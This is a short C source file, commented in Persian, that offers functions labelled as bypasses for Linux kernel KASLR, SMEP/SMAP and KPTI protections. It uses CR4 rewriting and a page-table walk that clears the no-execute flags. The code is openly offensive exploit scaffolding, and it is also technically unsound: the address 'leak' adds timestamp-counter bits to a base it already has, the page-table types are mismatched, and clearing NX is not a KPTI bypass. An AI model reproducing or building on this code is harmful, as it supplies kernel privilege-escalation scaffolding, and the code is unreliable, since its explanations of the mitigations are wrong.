#include <linux/kernel.h>
#include <linux/mm.h>
#include "memory.h"

// دور زدن KASLR (Kernel Address Space Layout Randomization)
unsigned long bypass_kaslr(void) {
    unsigned long kernel_base = get_kernel_base();
    
    // نشت آدرس هسته از طریق TSC
    unsigned long tsc = rdtsc();
    kernel_base += (tsc & 0xFFFF);
    
    return kernel_base;
}

// دور زدن SMEP/SMAP
void bypass_smep_smap(void) {
    unsigned long cr4 = read_cr4();
    write_cr4(cr4 & ~(X86_CR4_SMEP | X86_CR4_SMAP));
}

// دور زدن KPTI (Kernel Page Table Isolation)
void bypass_kpti(void) {
    // دستکاری مستقیم جدول صفحه‌بندی
    pgd_t *pgd = get_current_pgd();
    p4d_t *p4d;
    pud_t *pud;
    pmd_t *pmd;
    
    for (int i = 0; i < PTRS_PER_P4D; i++) {
        p4d = pgd + i;
        if (p4d_none(*p4d)) continue;
        
        pud = p4d_page(*p4d);
        for (int j = 0; j < PTRS_PER_PUD; j++) {
            if (pud_none(pud[j])) continue;
            
            pmd = pud_page(pud[j]);
            for (int k = 0; k < PTRS_PER_PMD; k++) {
                if (pmd_none(pmd[k])) continue;
                
                // حذف حفاظت صفحات
                pmd[k] = pmd_clear_flags(pmd[k], _PAGE_NX);
            }
        }
    }
}
